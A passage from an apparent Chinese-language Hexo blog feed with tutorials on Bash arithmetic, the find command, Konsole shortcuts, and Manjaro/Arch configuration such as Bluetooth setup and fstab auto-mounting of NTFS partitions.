expression</td><td>conditional operator</td><td></td><td></td></tr><tr class="odd"><td>=, *=, /=, %=, +=, -=, &lt;&lt;=, &gt;&gt;=, &amp;=, ^=,</td><td>=</td><td>assignment</td><td></td></tr></tbody></table><h3 id="整数运算"><strong>整数运算</strong></h3><p><strong>推荐使用第三种方法进行整数运算</strong></p><ol type="1"><li><p>legacy way： expr</p><p>最开始， Bourne shell提供了外置的命令行工具<code>expr</code>来在命令行上处理整数运算，但是比较笨拙，有些运算符号与shell的元字符冲突，需要转义(例如：<code>expr 1 \* 5</code>)，而且还有格式要求，因此虽然现在这个命令还存在，但是我们不经常使用它了。</p><p>bash shell 为了保持跟 Bourne shell 的兼容而包含了 expr命令，但它同样也提供了一种更简单的方法来执行数学表达式。</p></li><li><p>shell builtin commands：<em>let</em> or <em>declare</em></p><ol type="1"><li><p><code>let</code> 命令运算符与操作数之间不能有空格</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:42]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var=2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:52]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">let</span> var+=3</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:56]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">let</span> x=4 y=5 z=x*y u=z/2</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>declare</code> 进行整数运算还要写 <code>-i</code> 选项</p><blockquote><p>Integer Declaration using the declare -i notation can lead toconfusing or hard to read shell scripts.</p></blockquote><p>容易混淆或者降低代码可读性，因此放弃治疗。</p></li></ol></li><li><p>(推荐) 算数扩展</p><p>在 Bash 及更高级 shell 中求整数算术表达式的值的推荐方法是使用 shell的算术扩展（arithmetic expressions）。 内置的 shell 扩展允许你使用<code>((expression))</code>来进行整数运算,支持上文的表格中的所有操作符号。</p><p>格式：<code>$((...))</code>,其中运算数，运算符和括号之间有无空格都可（舒适~）。</p><p><code>$((...))</code> 被称为算数扩展（Arithmetic Expansion），<code>(())</code> 被称为复合命令（compound command ），在 bash中用来计算一个算数扩展。</p><blockquote><p>注意：<code>$[...]</code> 方括号也能在 bash中做算数扩展，但是该方法被弃用了，目前推荐使用 <code>$(())</code>。注意，不需要将双括号中表达式里的大于号转义。这是双括号命令提供的另一个高级特性。</p></blockquote><p>使用示例：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var1=3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var1</span></span></span><br><span class="line">3</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">((var1 += <span class="number">3</span>)) &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line">6</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var1=$((var1 + <span class="number">4</span>)) &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var1</span></span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $((var1++))</span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$var1</span> &amp;&amp; <span class="built_in">echo</span> $((++var1))</span></span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="进制运算">进制运算</h3><p>格式：<code>base#number</code></p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">16</span>#A+<span class="number">2</span> ))</span></span><br><span class="line">12</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">8#10</span> + <span class="number">2</span>))</span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">8#10</span> + <span class="number">10#2</span>))</span></span><br><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="浮点数运算">浮点数运算</h3><p>可以发现例如<code>$(( 3/2 ))</code>的算数扩展的返回值都是整数，而不是浮点数，因此，当需要得到浮点数时，我们需要进一步处理。</p><h4 id="使用-printf-内置命令">使用 printf 内置命令</h4><p>公式：</p><p><code>printf %.&lt;precision&gt;f "$((10**&lt;multiplier&gt; * 2/3))e-&lt;multiplier&gt;</code></p><p>注意：<code>%.&lt;precision&gt;f</code>里面的精度不要比 multiplier自身大，否则会填充数字零。</p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;结果为: %.3f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">结果为: 0.666</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;结果为: %.1f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">结果为: 0.7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;结果为: %.5f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">结果为: 0.66600</span><br></pre></td></tr></table></figure><h4 id="awk-命令">awk 命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;print 100/3&#125;&quot;</span></span></span><br><span class="line">33.3333</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;x=100/3; y=6; z=x*y; print z&#125;&quot;</span></span></span><br><span class="line">200</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;printf \&quot;%.2f\n\&quot;, 100/3&#125;&quot;</span></span></span><br><span class="line">33.33</span><br></pre></td></tr></table></figure><p>使用负数时，注意负号前面要有空格：<code>awk "BEGIN &#123;print -8.4 - -8&#125;"</code></p><h4 id="bc-命令">bc 命令</h4><p>bc - An arbitrary precision calculator language</p><ul><li><p>浮点运算是由内建变量 <code>scale</code>控制的。必须将这个值设置为你希望在计算结果中保留的小数位数，否则无法得到期望的结果。</p></li><li><p>scale 变量的默认值是 0。在 scale 值被设置前，bash计算器的计算结果不包含小数位。在将其值设置成 4 后，bash计算器显示的结果包含四位小数</p></li><li><p><code>-l</code> 默认保留 20 位小数</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1.6+3/2&quot;</span>|bc</span></span><br><span class="line">2.6</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;15.6+299.33*2.3/7.4&quot;</span> | bc</span></span><br><span class="line">108.63500000000000000000</span><br></pre></td></tr></table></figure><p>保留指定小数位：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;scale=2; 2/3&quot;</span> | bc</span></span><br><span class="line">.66</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 和 bc</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;scale=3;3/2&quot;</span> | bc</span></span><br><span class="line">1.500</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">awk 和 <span class="built_in">printf</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&#x27;BEGIN&#123;printf &quot;%.3f\n&quot;, 3/2&#125;&#x27;</span></span></span><br><span class="line">1.500</span><br></pre></td></tr></table></figure><p>注意： echo 和 bc 保留指定小数的方法有些不精确， <strong>echo有时直接截断，而不实施四舍五入</strong>，因此，建议使用的 printf 或者是awk. 案例：</p><p><ahref="https://www.hackerrank.com/challenges/bash-tutorials---compute-the-average/forum">Computethe Average</a></p><p>当你需要进行大量运算，在一个命令行中列出多个表达式就会有点麻烦，可以使用here document（内联重定向）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">variable=$(bc &lt;&lt; EOF</span><br><span class="line">options</span><br><span class="line">statements</span><br><span class="line">expressions</span><br><span class="line">EOF</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注：将选项和表达式放在脚本的不同行中可以让处理过程变得更清晰，提高易读性</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://www.shell-tips.com/bash/math-arithmetic-calculation/#introduction-to-integer-and-floating-points">MathArithmetic: How To Do Calculation in Bash?</a></li><li>Linux 命令行与 Shell 脚本编程大全</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>find 命令</title>
      <link href="/blog/2020/08/10/linux/tools/find/"/>
      <url>/blog/2020/08/10/linux/tools/find/</url>
      
        <content type="html"><![CDATA[<h2 id="命令格式">命令格式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [where to start searching from] [expression determines what to find] [-options] [what to find]</span><br></pre></td></tr></table></figure><h3 id="示例">示例</h3><p>find 命令: <code>find . -name "?fs*"</code></p><p>解释:</p><ol type="1"><li><code>.</code>，表示搜索位置从当前目录搜索，<strong>如果你不指定搜索的位置，那么默认从当前目录搜索。</strong></li><li><code>-name</code>， 选项指定搜索什么样文件名，后面跟expression,可以使用元字符。</li><li><code>"?fs*"</code>， 表示搜索第一个字母任意，第二三个字母为<code>fs</code>，后面字母任意的文件名。</li></ol><h2 id="options">Options</h2><p>学习一下常用的选项。</p><ul><li><code>-exec CMD</code>: The file being searched which meets theabove criteria and returns 0 for as its exit status for successfulcommand execution.</li><li><code>-ok CMD</code> : It works same as -exec except the user isprompted first.</li><li><code>-size +N/-N[cwbkMG]</code> : Search for files of ‘N’blocks;</li><li>timestamp： search for file of specific timestamp<code>-atime</code>、<code>-modify</code>、<code>change</code></li><li><code>-type TYPE</code>：The directory TYPE is <code>d</code>，Thefile TYPE is <code>f</code></li><li><code>-empty</code> : Search for empty files and directories.</li><li><code>-newer file</code> : Search for files that weremodified/created after ‘file’.</li></ul><h2 id="emptynewer">empty，newer</h2><p><code>-empty</code> 测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find -empty</span><br><span class="line">./hello</span><br><span class="line"></span><br><span class="line"># violetv at manjaro in ~/test [10:40:33]</span><br><span class="line">$ find ./ -empty</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure><p><code>-newer file</code> 测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find -newer test2.py</span></span><br><span class="line">.</span><br><span class="line">./full</span><br><span class="line">./hello</span><br><span class="line">./world</span><br><span class="line">./world/test</span><br><span class="line">./world/test/test.txt</span><br></pre></td></tr></table></figure><h2 id="size"><code>-size</code></h2><p><code>-size +N/-N[cwbkMG]</code> : Search for files of ‘N’blocks;</p><p><strong>Bear in mind that the size is rounded up to the nextunit</strong>. Therefore -size -1M is not equivalent to -size-1048576c.</p><p><code>+N</code> means size &gt; ‘N’ blocks and <code>-N</code> meanssize &lt; 'N' blocks. No <code>+</code> or <code>-</code> meansequal.</p><p>Unit:</p><ul><li><code>b</code>： for 512-byte blocks (this is the default if nosuffix is used)</li><li><code>c</code>： for bytes</li><li><code>k</code>： for kibibytes (KiB, units of 1024 bytes)</li><li><code>M</code>： for mebibytes (MiB, unitsof<code>1024 \* 1024 = 1048576 bytes</code>)</li><li><code>G</code>： for gibibytes (GiB, units of<code>1024 * 1024 * 1024 = 1073741824 bytes</code>)</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -size +2G</span></span><br><span class="line">-rw-r--r-- 1 violetv violetv 2897272832 Aug  1 10:35 ./full</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -<span class="built_in">type</span> f  -size +1k -<span class="built_in">exec</span> <span class="built_in">ls</span> -hl &#123;&#125; \;</span></span><br><span class="line">-rw-r--r-- 1 violetv violetv 1.8G Aug  1 11:14 ./full</span><br></pre></td></tr></table></figure><h2 id="timestamp">timestamp</h2><p>Linux has 3 time stamps associated to a file:</p><ol type="1"><li>Access - the last time the file was read</li><li>Modify - the last time the file was modified (content has beenmodified)</li><li>Change - the last time meta data of the file was changed</li></ol><p>选项： <code>-amin, -atime, -cmin, -ctime, -mmin,-mtime</code></p><p>选项开头为 3 种时间戳的首字母。 <code>-mtime n</code>：查找系统中最近<code>n*24</code> 被修改的文件 <code>-amin n</code>： 查找系统中最近 n分钟访问的文件 <code>+</code> 和 <code>-</code> 表示大于小于</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find -atime +1</span></span><br><span class="line">.</span><br><span class="line">./dfs.py</span><br><span class="line">./tempCodeRunnerFile.py</span><br><span class="line">./test2.py</span><br><span class="line">./self_print.py</span><br><span class="line">./some.txt</span><br><span class="line">./reversed_cls.py</span><br><span class="line">./str_repr.py</span><br><span class="line">./spoofing.py</span><br><span class="line">./hashable.py</span><br></pre></td></tr></table></figure><h2 id="exec-和--ok"><code>-exec</code> 和 <code>-ok</code></h2><p><code>-exec</code> 后面的格式是：<code>命令+空格+&#123;&#125;+空格+\;</code></p><ul><li>花括号 <code>&#123;&#125;</code>，代表前面 find 命令查找出来的文件名。</li><li>以分号 ";"作为结束标识符的，考虑到各个系统平台对分号的不同解释，我们在分号前再加个反斜杠，便于移植。</li></ul><ol type="1"><li><p>使用 find 命令查找相关文件后，再使用 rm 命令将它们删除</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -size +1G -<span class="built_in">exec</span> <span class="built_in">rm</span> -i &#123;&#125; \;</span></span><br><span class="line">rm: remove regular file &#x27;./full&#x27;? ^C</span><br></pre></td></tr></table></figure></p></li><li><p>搜索匹配到的文件中的关键内容</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*.py&quot;</span> -<span class="built_in">exec</span> grep <span class="string">&quot;lambda&quot;</span> &#123;&#125; \;</span></span><br><span class="line">pkt = sniff(filter=&#x27;tcp&#x27;, prn=lambda pkt:pkt.show())</span><br></pre></td></tr></table></figure></p></li><li><p>查找文件并移动到指定目录</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [11:28:55]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*.py&quot;</span> -<span class="built_in">exec</span>  <span class="built_in">mv</span> &#123;&#125; ../test_tmp \;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [11:29:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll ../test_tmp</span></span><br><span class="line">total 32K</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 772 Jul 22 15:07 dfs.py</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 728 Jul 20 21:20 hashable.py</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 520 Jul 22 16:23 reversed_cls.py</span><br></pre></td></tr></table></figure></p></li><li><p>删除 n 天前的文件</p><p><code>find path -type f -mtime +n -exec rm -fi &#123;&#125; \；</code></p></li><li><p>查看当前目录下文件个数:</p><p><code>find ./ | wc -l</code></p></li><li><p>find 与 xargs 配合 类似于使用 <code>-exec</code>，但是 xargs速度更快。</p><ul class="task-list"><li><label><input type="checkbox" />关于 xargs可以看我的另一篇博文：xargs 命令</label></li></ul></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li>manual of find: <code>man find</code></li><li><ahref="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&amp;mid=2247485216&amp;idx=1&amp;sn=c6d972e5a09d1d60433d733c3b3e0365&amp;=41#wechat_redirect">Linux下 find 与 exec 的联手干大事</a></li><li><ahref="https://stackoverflow.com/questions/40630695/linux-modify-file-modify-access-change-time">Linux- modify file modify/access/change time</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro KDE 使用</title>
      <link href="/blog/2020/08/07/linux/manjaro/manjaro_usage/"/>
      <url>/blog/2020/08/07/linux/manjaro/manjaro_usage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>遇到什么，随时更新</p></blockquote><h2 id="konsole">Konsole</h2><p>Konsole 快捷键：</p><p><code>Ctrl+Alt+t</code>: 打开 Konsole</p><p><code>Ctrl+ (</code>: 左/右分割视图</p><p><code>Ctrl+ )</code>: 拆分视图顶部/底部</p><p><code>Shift+ Tab</code>: 在拆分视图之间循环</p><p><code>Ctrl + Shift+ Left Arrow/ Right Arrow</code>:在拆分视图窗格之间切换</p><p><code>Shift+ Left Arrow/ Right Arrow</code>:在选项卡/视图之间循环显示当前视图</p><p><code>Ctrl + shift+w</code>: 关闭当前视图</p><p><code>Ctrl + shift +Tab</code> 或者 <code>Ctrl + w</code>:创建新标签页</p><p><code>Ctrl +shift+c</code>： Copy</p><p><code>Ctrl +shift+v</code>： Paste （File path）</p><p><code>Shift+Ctrl+F</code> 打开 Find窗口，提供待搜索文本的搜索选项</p><p><code>reset</code> 命令：初始化（重置）终端</p><p><code>Ctrl+Shift+q</code> 退出 Konsole Terminal 仿真应用</p><h2 id="开机自动挂载-ntfs-格式分区">开机自动挂载 NTFS 格式分区</h2><ol type="1"><li><p>安装 ntfs-3g</p><p><code>sudo pacman -S ntfs-3g</code></p></li><li><p>修改<code>fstab</code></p><p>sudo vim /etc/fstab</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># /etc/fstab: static file system information</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span></span><br><span class="line"></span><br><span class="line">/dev/sdb1 /run/media/realyee/notes ntfs-3g defaults 0 0</span><br><span class="line">/dev/sdb2 /run/media/realyee/software ntfs-3g defaults 0 0</span><br></pre></td></tr></table></figure></p><p>说明，把/dev/sdb1 挂在到 <code>/run/media/realyee/notes</code>目录下，type 为 <code>ntfs-3g</code> 以后每次开机，Manjaro都会自动挂载分区。</p></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://wiki.archlinux.org/index.php/Fstab">fstab</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arch 发行版配置</title>
      <link href="/blog/2020/08/07/linux/manjaro/arch_config/"/>
      <url>/blog/2020/08/07/linux/manjaro/arch_config/</url>
      
        <content type="html"><![CDATA[<h2 id="剪切板">剪切板</h2><p><code>yay -S xclip</code></p><h2 id="解压软件">解压软件</h2><p>添加对 7zip，rar， zip 的支持</p><p><code>yay -S unarchiver p7zip rar unzip</code></p><h2 id="蓝牙">蓝牙</h2><ol type="1"><li><code>sudo pacman -S bluez bluez-utils bluedevil</code></li><li>Start/enable bluetooth.service.</li></ol><ul><li>bluez: 提供蓝牙协议栈</li><li>bluez-utils: 提供 bluetoothctl 工具</li><li>bluedevil: KDE's blutooth tool</li></ul><h2 id="蓝牙耳机">蓝牙耳机</h2><p><code>sudo pacman -S pulseaudio-alsa, pulseaudio-bluetooth pavucontrol pulseaudio-alsa</code></p><ul><li>pulseaudio-bluetooth 则为 bluez 提供了 PulseAudio音频服务,若没有安装则蓝牙设备在配对完成后,连接会失败,提示</li><li>pavucontrol 则提供了 pulseaudio 的图形化控制界面</li><li>pulseaudio-alsa(可选)则使 pulseaudio 和 alsa 协同使用，之后就可以用alsamixer 来管理蓝牙音频了</li></ul><h2 id="自动挂载">自动挂载</h2><ol type="1"><li><p>安装 ntfs-3g <code>sudo pacman -S ntfs-3g</code></p></li><li><p>确定要挂载的分区 <code>fdisk -l</code></p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Device          Start        End   Sectors   Size Type</span><br><span class="line">/dev/sdb1        2048  652224504 652222457   311G Microsoft basic data</span><br><span class="line">/dev/sdb2   652224512 1302949805 650725294 310.3G Microsoft basic data</span><br><span class="line">/dev/sdb3  1302949808 1953525134 650575327 310.2G Microsoft basic data</span><br></pre></td></tr></table></figure></p><p>例如：我要挂载<code>/dev/sdb1</code>、<code>/dev/sdb2</code></p></li><li><p>记住在 Windows 上对应该分区的名字 例如：上面两个叫做<code>notes，software</code></p></li><li><p>修改 fstab</p><p><code>sudo vim /etc/fstab</code></p><p>按照对应格式在文件末尾加上最后四句，其中 <code>&lt;dir&gt;</code>字段根据自己的绝对路径写</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Static information about the filesystems.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See fstab(5) <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;file system&gt; &lt;<span class="built_in">dir</span>&gt; &lt;<span class="built_in">type</span>&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda5</span></span><br><span class="line">UUID=49ab84d9-8361-46f4-8f68-a18201dc105d       /               ext4            rw,relatime     0 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda1</span></span><br><span class="line">UUID=34DB-E5F7          /boot/efi       vfat            rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro       0 2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda4</span></span><br><span class="line">UUID=236b02b4-f6b4-46ce-90c6-fff28b4a7a31       none            swap            defaults        0 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/sdb1</span></span><br><span class="line">/dev/sdb1               /run/media/realyee/notes       ntfs-3g         defaults        0       0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/sdb2</span></span><br><span class="line">/dev/sdb2               /run/media/realyee/software    ntfs-3g         defaults        0       0</span><br></pre></td></tr></table></figure></p></li><li><p>完成，以后开机自动挂载</p></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://wiki.archlinux.org/index.php/Fstab">arch_wikifstab</a></li><li><a href="https://wiki.archlinux.org/index.php/bluetooth">arch_wikibluetooth</a></li><li><ahref="https://wiki.archlinux.org/index.php/Bluetooth_headset#Headset_via_Bluez5/PulseAudio">arch_wikiBluetooth headset</a></li><li><ahref="https://wiki.archlinux.org/index.php/Archiving_and_compression">Archivingand compression</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fcitx5、输入法、词库安装配置</title>
      <link href="/blog/2020/08/07/linux/manjaro/fcitx5/"/>
      <url>/blog/2020/08/07/linux/manjaro/fcitx5/</url>
      
